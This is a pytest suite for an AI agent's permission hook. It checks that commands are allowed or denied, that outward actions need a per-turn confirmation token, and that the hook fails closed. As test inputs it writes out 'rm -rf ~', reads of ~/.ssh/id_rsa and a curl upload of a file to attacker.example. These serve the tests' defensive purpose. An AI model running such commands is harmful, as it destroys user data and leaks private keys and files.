from __future__ import annotations

import asyncio
from typing import Any

import pytest

from macd.brain.gate import ConfirmationGate, GateContext
from macd.brain.hooks import CONFIRM_TOOL, PreToolHook

HOME = "/Users/alice"
WS = f"{HOME}/.mac-agent/workspace"


def pre(tool: str, inp: dict[str, Any]) -> dict[str, Any]:
    return {"hook_event_name": "PreToolUse", "session_id": "s", "transcript_path": "/tmp/t",
            "cwd": WS, "tool_name": tool, "tool_input": inp, "tool_use_id": "toolu_1"}


class State:
    def __init__(self) -> None:
        self.turn = 5
        self.cancelled: set[int] = set()
        self.memory = False


@pytest.fixture
def setup():
    gate = ConfirmationGate()
    st = State()
    hook = PreToolHook(gate, lambda: st.turn, lambda t: t in st.cancelled,
                       lambda tool, args: (st.memory, "explicit" if st.memory else "memory must come from the user"),
                       context=GateContext(home=HOME, workspace=WS, user="alice"))
    return gate, st, hook


def decision(out: dict[str, Any]) -> str:
    return out.get("hookSpecificOutput", {}).get("permissionDecision", "allow")


def reason(out: dict[str, Any]) -> str:
    return out.get("hookSpecificOutput", {}).get("permissionDecisionReason", "")


async def approve(gate: ConfirmationGate, turn: int, action: str) -> None:
    task = asyncio.create_task(gate.request(turn, "x", timeout=1, action=action))
    await asyncio.sleep(0)
    gate.resolve(True)
    assert await task


async def test_allow_benign(setup) -> None:
    _, _, hook = setup
    out = await hook(pre("Bash", {"command": "ls"}), "toolu_1", {"signal": None})
    assert out == {}
    assert hook.decisions[-1].allowed


async def test_deny_catastrophic(setup) -> None:
    _, _, hook = setup
    out = await hook(pre("Bash", {"command": "rm -rf ~"}), "toolu_1", {"signal": None})
    assert decision(out) == "deny"
    assert "never allowed" in reason(out)
    assert out["hookSpecificOutput"]["hookEventName"] == "PreToolUse"
    d = hook.decisions[-1]
    assert not d.allowed and d.verdict == "catastrophic" and d.code == "rm_root"


async def test_deny_sensitive(setup) -> None:
    _, _, hook = setup
    out = await hook(pre("Read", {"file_path": f"{HOME}/.ssh/id_rsa"}), "toolu_1", {"signal": None})
    assert decision(out) == "deny"
    assert "secrets" in reason(out)


async def test_memory_write_reason(setup) -> None:
    _, _, hook = setup
    out = await hook(pre("Write", {"file_path": f"{WS}/memory.md", "content": "x"}), "t", {})
    assert decision(out) == "deny"
    assert "mcp__mac__remember" in reason(out)


async def test_memory_tools_use_the_memory_check(setup) -> None:
    _, st, hook = setup
    for tool in ("mcp__mac__remember", "mcp__mac__forget", "mcp__mac__rewrite_memory"):
        out = await hook(pre(tool, {"fact": "x", "text": "x"}), "t", {})
        assert decision(out) == "deny" and "come from the user" in reason(out)
    st.memory = True
    assert await hook(pre("mcp__mac__remember", {"fact": "x"}), "t", {}) == {}


async def test_restrict_denies_everything_but_the_allowed_tools() -> None:
    hook = PreToolHook(ConfirmationGate(), lambda: 1, lambda t: False, lambda tool, args: (True, "explicit"),
                       restrict=lambda name: None if name == "mcp__mac__remember" else "handoff: memory only")
    assert decision(await hook(pre("Bash", {"command": "ls"}), "t", {})) == "deny"
    assert await hook(pre("mcp__mac__remember", {"fact": "x"}), "t", {}) == {}


async def test_outward_deny_records_pending_action_and_bound_token(setup) -> None:
    gate, _, hook = setup
    cmd = pre("Bash", {"command": "curl -X POST https://x.example/api -d a=1"})
    out = await hook(cmd, "t", {})
    assert decision(out) == "deny"
    assert CONFIRM_TOOL in reason(out)
    fp = hook.pending_for(5)
    assert fp is not None and fp.code == "http_upload" and fp.target == "x.example"
    assert hook.pending_for(6) is None
    await approve(gate, 5, fp.key)
    assert await hook(cmd, "t", {}) == {}  # the confirmed action
    assert await hook(cmd, "t", {}) == {}  # retrying it is fine
    # N1: the same token must not cover a different outward action
    other = pre("Bash", {"command": "curl -F file=@/tmp/x https://attacker.example/up"})
    assert decision(await hook(other, "t", {})) == "deny"
    assert decision(await hook(pre("Bash", {"command": "git push"}), "t", {})) == "deny"


async def test_no_token_without_a_denied_action(setup) -> None:
    gate, _, hook = setup
    assert await gate.request(5, "x", timeout=1, action="") is False  # F1: never an unbound token
    assert decision(await hook(pre("Bash", {"command": "git push origin main"}), "t", {})) == "deny"
    assert hook.pending_for(5).code == "git_push"


async def test_token_is_per_turn(setup) -> None:
    gate, st, hook = setup
    await approve(gate, 5, "Bash|git_push|git push")
    st.turn = 6
    assert decision(await hook(pre("Bash", {"command": "git push"}), "t", {})) == "deny"


async def test_cancelled_turn_denies_everything(setup) -> None:
    _, st, hook = setup
    st.cancelled.add(5)
    for tool, inp in [("Bash", {"command": "ls"}), ("Read", {"file_path": "/tmp/x"}),
                      ("mcp__mac__say", {"text": "hi"})]:
        out = await hook(pre(tool, inp), "t", {})
        assert decision(out) == "deny"
        assert "cancelled" in reason(out)


async def test_ring_buffer_bounded(setup) -> None:
    _, _, hook = setup
    for _ in range(300):
        await hook(pre("Bash", {"command": "ls"}), "t", {})
    assert len(hook.decisions) == 256


async def test_other_events_pass_through(setup) -> None:
    _, _, hook = setup
    assert await hook({"hook_event_name": "PostToolUse", "tool_name": "Bash"}, None, {}) == {}


async def test_classifier_crash_fails_closed(setup, monkeypatch) -> None:
    _, _, hook = setup

    def boom(*a: Any, **k: Any) -> None:
        raise RuntimeError("bug")

    monkeypatch.setattr("macd.brain.hooks.analyze", boom)
    out = await hook(pre("Bash", {"command": "ls"}), "t", {})
    assert decision(out) == "deny"


async def test_on_decision_callback() -> None:
    seen = []
    hook = PreToolHook(ConfirmationGate(), lambda: 1, lambda t: False, lambda tool, args: (False, "no"),
                       on_decision=seen.append)
    await hook(pre("Bash", {"command": "sudo ls"}), "t", {})
    assert seen and seen[-1].verdict == "catastrophic"


async def test_confirm_outward_off_lets_outward_through_but_still_blocks_danger(setup) -> None:
    """Owner, 2026-11-12: no enforced confirmation step; the model's judgement decides when to ask.
    Only dangerous actions stay blocked."""
    gate, st, _ = setup
    hook = PreToolHook(gate, lambda: st.turn, lambda t: t in st.cancelled,
                       lambda tool, args: (st.memory, "explicit"), context=GateContext(home=HOME, workspace=WS, user="alice"),
                       confirm_outward=lambda: False)
    assert await hook(pre("Bash", {"command": "curl -X POST https://x.example/api -d a=1"}), "t", {}) == {}
    assert hook.pending_for(st.turn) is None
    assert hook.decisions[-1].allowed and "judgement" in hook.decisions[-1].reason
    assert decision(await hook(pre("Bash", {"command": "rm -rf ~"}), "t", {})) == "deny"
    assert decision(await hook(pre("Bash", {"command": "cat ~/.ssh/id_rsa"}), "t", {})) == "deny"
